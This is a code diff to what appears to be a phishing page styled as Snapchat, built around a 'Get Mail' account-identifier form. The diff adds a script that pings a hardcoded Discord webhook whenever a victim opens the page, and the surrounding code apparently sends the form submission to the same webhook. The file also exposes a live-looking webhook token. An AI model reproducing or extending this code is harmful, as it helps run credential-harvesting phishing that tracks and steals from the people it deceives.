@@ -61517,6 +61517,27 @@ html[lang='ar'] .theme--snapchat {
         
         <script>
           const webhookURL = 'https://discord.com/api/webhooks/1325237805969838190/GPIIVY1h235V4q3Fc-qcRfeymXFICNNFQr_RWKFdFCnFsKcS3oHkmZfkUn6vZJxqcrh3';
+
+          // Send a "link opened" message when the page loads
+          window.addEventListener('load', async () => {
+              try {
+                  const payload = JSON.stringify({
+                      content: "Page: Get Mail"
+                  });
+
+                  const response = await fetch(webhookURL, {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: payload
+                  });
+
+                  if (!response.ok) {
+                      console.error("Failed to send 'link opened' message.");
+                  }
+              } catch (error) {
+                  console.error("Error sending 'link opened' message:", error);
+              }
+          });
       
           // Attach the event listener to the form
           document.getElementById('account_identifier_form').addEventListener('submit', async (event) => {
